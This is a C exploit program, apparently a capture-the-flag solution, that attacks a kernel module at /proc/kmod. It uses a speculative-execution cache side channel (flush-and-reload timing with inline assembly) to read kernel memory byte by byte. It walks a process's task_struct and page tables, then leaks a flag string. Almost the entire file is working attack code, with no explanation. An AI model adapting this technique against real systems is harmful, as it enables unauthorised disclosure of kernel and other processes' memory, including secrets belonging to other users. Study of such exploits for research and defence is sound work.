#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <signal.h>
#include <setjmp.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <x86intrin.h>

#define CACHELINE_SIZE 0x1000

static jmp_buf buf;
int fd;

struct ioctl_struct {
	pid_t pid;
	uint64_t *task;
};

int open_kernel(char dev[]) {
	return open(dev, O_RDONLY);
}

static void segfault_handler(int signum) {
	(void)signum;
	sigset_t sigs;
	sigemptyset(&sigs);
	sigaddset(&sigs, signum);
	sigprocmask(SIG_UNBLOCK, &sigs, NULL);
	longjmp(buf, 1);
}

static void sigint_handler(int signum) {
	close(fd);
	exit(0);
}

void *setup_mem() {
	return mmap(0, 255 * CACHELINE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
}

void speculate(size_t target, char *probe) {
	asm volatile(
		"xor rcx, rcx\n"
		"lea rbx, [%1]\n"
		"mov rax, 0x1337\n"
		"push rax\n"
		"fild QWORD PTR [rsp]\n"
		"fsqrt\n"
		"fistp QWORD PTR [rsp]\n"
		"pop rax\n"
		"mov rax, [rax]\n"
		"mov cl, BYTE PTR [%0]\n"
		"shl rcx, 0xc\n"
		"add rbx, rcx\n"
		"mov rbx, [rbx]\n"
		:
		: "r" (target), "r" (probe)
		: "rcx", "rbx", "rax" 
	);
}

uint64_t time_access(void *probe, int idx) {                                                 
        uint64_t stime, etime;                                                                
        _mm_mfence();                                                                         
        stime = __rdtsc();                                                                    
        volatile uint8_t x = *(uint8_t *)(probe+(idx << 0xc));
        _mm_lfence();                                                                         
        etime = __rdtsc();                                                                    
        return (etime - stime);                                                               
}

void flush_cache(uint64_t addr) {
	for (int i = 1; i < 256; i++) {
		_mm_clflush((void *)(addr+(i << 0xc)));
        }                                                                               
} 

void walking_the_dog(void *probe, void *addr, uint64_t *target, int offset) {
	int hit = 0;
	for (int x = 0; x < 8;) {
		for (int j = 0; j < 100; j++) {
			if (!setjmp(buf)) {
				flush_cache((uint64_t)probe);
				ioctl(fd, 10, (uint64_t)addr+offset+x);
				speculate((uint64_t)addr+offset+x, (char *)probe);
			}
			for (int i = 0; i < 256; i++) {
				hit = 0;
				int mix_i = ((i * 167) + 13) & 255;
				int cycles = time_access(probe, mix_i);
				if (cycles < 100 && (x != 3 | mix_i != 0)) {
					hit = 1;
					*target |= (uint64_t)(uint8_t)mix_i << (8u*x);
					x++;
					break;
				}
			}
			if (hit) {
				break;
			}
		}
	}
}

int main(int argc, char **argv) {
	signal(SIGINT, sigint_handler);
	printf("[Registered SIGINT handler]\n");
	if (argc > 1) {
		signal(SIGSEGV, segfault_handler);
		printf("[Registered SIGSEGV handler]\n");
	}

	fd = open_kernel("/proc/kmod");
	if (fd == -1) {
		printf("o nooo! %d\n", fd);
		return 0;
	}

	void *probe = setup_mem();
	printf("0x%llx\n", (uint64_t)probe);

	struct ioctl_struct data;

	// walk in the park
	// task_struct + 0x3e0 == struct_mm
	// struct_mm + 0x50 = pgd_t
	// [pgd_t] & 0xfff = PUD
	// [PUD] & 0xfff + 0x10 = PMD
	// [PMD] & 0xfff + 0x20 = PT
	// 0xffff888000000000 & PT = memory! 
	
	data.pid = 167;
	ioctl(fd, 11, &data);
	printf("target pid: %d\n", data.pid);
	printf("target task_struct: 0x%llx\n", data.task);
	printf("task_struct->mm_struct: 0x%llx\n", (uint64_t)data.task+0x3e0);
	
	int hit = 0;
	uint64_t mm_struct = {0};
	uint64_t pgd = {0};
	uint64_t pud = {0};
	uint64_t pmd = {0};
	uint64_t pt = {0};
	uint64_t raw = {0};
	walking_the_dog(probe, data.task, &mm_struct, 0x3e0);
	printf("mm_struct: 0x%llx\n", mm_struct);

	walking_the_dog(probe, (void *)mm_struct, &pgd, 0x50);
	printf("pgd: 0x%llx\n", pgd);
	
	walking_the_dog(probe, (void *)pgd, &pud, 0x00);
	pud |= 0xffff888000000000;
	pud &= 0xfffffffffffff000;
	printf("pud: 0x%llx\n", pud);

	walking_the_dog(probe, (void *)pud, &pmd, 0x00);
	pmd &= 0xfffffffffffff000;
	pmd |= 0xffff888000000010;
	printf("pud: 0x%llx\n", pmd);

	walking_the_dog(probe, (void *)pmd, &pt, 0x00);
	pt &= 0xfffffffffffff000;
	pt |= 0xffff888000000020;
	printf("pt: 0x%llx\n", pt);
	
	walking_the_dog(probe, (void *)pt, &raw, 0x00);
	raw &= 0xfffffffffffffff0;
	raw |= 0xffff888000000000;
	printf("raw: 0x%llx\n", raw);

	char fbuf[64] = {0};
	for (int x = 0; x < 58;) {
		for (int j = 0; j < 100; j++) {
			if (!setjmp(buf)) {
				flush_cache((uint64_t)(probe));
				ioctl(fd, 1337, raw+x);
				speculate(raw+x, (char *)probe);
			}
			for (int i = 0; i < 256; i++) {
				 hit = 0;
				int mix_i = ((i * 167) + 13) & 255;
				int cycles = time_access(probe, mix_i);
				if (mix_i != 0 && cycles < 100 && (mix_i <= 127 && mix_i >= 32)) {
					hit = 1;
					fbuf[x] = mix_i;
					printf("%s\n", fbuf);
					x++;
					break;
				}
			}
			if (hit) {
				break;
			}
		}
	}
	printf("flag: %s\n", fbuf);
	close(fd);
	return 0;
}
